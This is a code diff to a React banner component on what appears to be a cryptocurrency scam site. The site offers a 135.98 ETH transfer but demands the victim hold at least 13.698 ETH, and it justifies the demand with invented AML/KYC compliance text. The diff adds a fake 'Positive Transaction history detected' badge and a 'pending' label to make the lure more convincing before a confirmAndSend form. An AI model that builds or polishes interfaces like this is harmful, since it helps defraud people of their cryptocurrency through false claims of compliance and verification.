@@ -5,6 +5,8 @@ import VerifyAddressForm from "./VerifyAddressForm"
 import ConnectButton from "./ConnectButton"
 import useEthToUsdPrice from "@/lib/ethPriceToUsdState"
 import { convertETHtoUSD } from "@/lib/functions"
+import { twMerge } from "tailwind-merge"
+import { AlarmCheck, Check } from "lucide-react"
 
 const Banner = () => {
 
@@ -245,11 +247,21 @@ const Banner = () => {
                 // 20.39
                 accountsConnected ? <>
                     {userBalance < 13.698 && (
-                        <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
-                            <p>
-                                Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 10% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
-                            </p>
-                        </div>
+                        <>
+                            {userBalance > 0 && (
+                                <div className="flex items-center gap-x-3 border border-green-500 rounded-md mb-4 p-3">
+                                    <span className="p-1 rounded-full bg-green-500 text-white">
+                                        <Check size={16} className="text-white" />
+                                    </span>
+                                    <p>Positive Transaction history detected on account <span className="font-bold break-all">{account}</span></p>
+                                </div>
+                            )}
+                            <div className={twMerge("bg-red-600 text-white p-4 mb-4 rounded-md", userBalance > 0 && "bg-yellow-200 text-black")}>
+                                <p>
+                                    Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 10% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
+                                </p>
+                            </div>
+                        </>
                     )}
                     {userBalance >= 13.698 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
@@ -258,7 +270,7 @@ const Banner = () => {
                         <div className="p-4 rounded-md border border-red-600">
                             <div className="flex flex-col gap-y-2">
                                 <h4>Wallet balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance, ethToUsd)})</span></h4>
-                                <h4>Minimum Required Balance: <span className="font-bold">13.698 ETH ({convertETHtoUSD(13.698, ethToUsd)})</span></h4>
+                                <h4>Minimum Required Balance: {userBalance > 0 ? <span className='text-sm inline-flex gap-x-2 bg-yellow-200 px-2 py-1 rounded-full items-center w-fit font-medium'><AlarmCheck size={12} />pending</span> : <span className="font-bold">13.698 ETH ({convertETHtoUSD(13.698, ethToUsd)})</span>}</h4>
                                 <h4>Transfer amount: <span className="font-bold">135.98 ETH ({convertETHtoUSD(135.98, ethToUsd)?.toString()})</span></h4>
                             </div>
                         </div>
